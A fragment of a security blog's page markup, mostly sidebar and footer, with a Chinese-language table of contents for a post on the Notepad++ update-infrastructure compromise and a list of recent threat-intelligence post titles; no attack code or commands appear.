year:https://cyberfire.energy.gov/foundry/2025-2/#s=Schedule The courses span multiple areas, including:  Network Archaeology (packet analysis) Host-based forensics Malwa...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar_img.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">QSWeb3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/qsweb3"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%A7%80"><span class="toc-number">1.</span> <span class="toc-text">概觀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">簡介事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B-notepad"><span class="toc-number">1.1.1.</span> <span class="toc-text">簡介 notepad++</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E6%93%8A%E6%99%82%E9%96%93"><span class="toc-number">1.2.</span> <span class="toc-text">攻擊時間</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%B6%E5%89%8D%E9%A2%A8%E9%9A%AA%E9%AB%98%E7%9A%84%E4%BA%BA"><span class="toc-number">1.3.</span> <span class="toc-text">當前風險高的人</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%B6%E5%89%8D%E5%BB%BA%E8%AD%B0%E6%8E%AA%E6%96%BD"><span class="toc-number">1.4.</span> <span class="toc-text">當前建議措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">惡意程式分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E5%9C%98%E9%9A%8A%E6%96%87%E7%AB%A0"><span class="toc-number">2.1.</span> <span class="toc-text">整理卡巴斯基團隊文章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%80%8B%E6%94%BB%E6%93%8A%E9%8F%88-2025-07-2025-08"><span class="toc-number">2.1.1.</span> <span class="toc-text">第一個攻擊鏈 - 2025.07 - 2025.08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%80%8B%E6%94%BB%E6%93%8A%E9%8F%88-2025-09"><span class="toc-number">2.1.2.</span> <span class="toc-text">第二個攻擊鏈 - 2025.09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%80%8B%E6%94%BB%E6%93%8A%E9%8F%88-2025-10"><span class="toc-number">2.1.3.</span> <span class="toc-text">第三個攻擊鏈 - 2025.10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%AD%B8%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%80%8B%E6%94%BB%E6%93%8A%E9%8F%88-2025-10"><span class="toc-number">2.1.4.</span> <span class="toc-text">回歸的第二個攻擊鏈 - 2025.10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E7%90%86-Rapid7-%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0"><span class="toc-number">2.2.</span> <span class="toc-text">整理 Rapid7 分析文章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%AD%98%E5%8F%96"><span class="toc-number">2.2.2.</span> <span class="toc-text">初始存取</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/notepad-plus-plus-compromised-lotus-blossom-apt/" title="Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透">Notepad++ 更新基礎設施遭攻擊：疑似中國 APT 組織 Lotus 發動供應鏈滲透</a><time datetime="2026-02-04T15:29:37.000Z" title="Created 2026-02-04 15:29:37">2026-02-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/My-Experience-at-CyberFire-Foundry-2025-2-Advanced-Malware-Analysis-2/" title="Deep Dive into Advanced Malware Analysis: My Experience at CyberFire Foundry 2025-2">Deep Dive into Advanced Malware Analysis: My Experience at CyberFire Foundry 2025-2</a><time datetime="2025-12-29T11:57:14.000Z" title="Created 2025-12-29 11:57:14">2025-12-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/c2-pdns-asn-analysis/" title="從 C2 IP 到威脅情資：利用 Passive DNS 關聯分析">從 C2 IP 到威脅情資：利用 Passive DNS 關聯分析</a><time datetime="2025-12-02T15:02:50.000Z" title="Created 2025-12-02 15:02:50">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/unearthing-malicious-abuse-in-namecoin-emercoin-blockchain-dns/" title="[區塊鏈論文][DNS 惡意利用] 揭露去中心化網路的陰暗面：Namecoin 與 Emercoin 中超過 50.7% 的 IP 遭惡意濫用">[區塊鏈論文][DNS 惡意利用] 揭露去中心化網路的陰暗面：Namecoin 與 Emercoin 中超過 50.7% 的 IP 遭惡意濫用</a><time datetime="2025-10-22T11:37:56.000Z" title="Created 2025-10-22 11:37:56">2025-10-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/etherhide-blockchain-cnc/" title="Etherhide Explained: The Rise of Blockchain-Based Command and Control"><img src="https://raw.githubusercontent.com/qsweb3/post-cover-img/refs/heads/main/coverEtherHide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Etherhide Explained: The Rise of Blockchain-Based Command and Control"/></a><div class="content"><a class="title" href="/etherhide-blockchain-cnc/" title="Etherhide Explained: The Rise of Blockchain-Based Command and Control">Etherhide Explained: The Rise of Blockchain-Based Command and Control</a><time datetime="2025-10-16T09:31:29.000Z" title="Created 2025-10-16 09:31:29">2025-10-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(to top, rgb(3, 3, 18), rgb(10, 26, 51), rgb(18, 8, 36));;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By QSWeb3</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>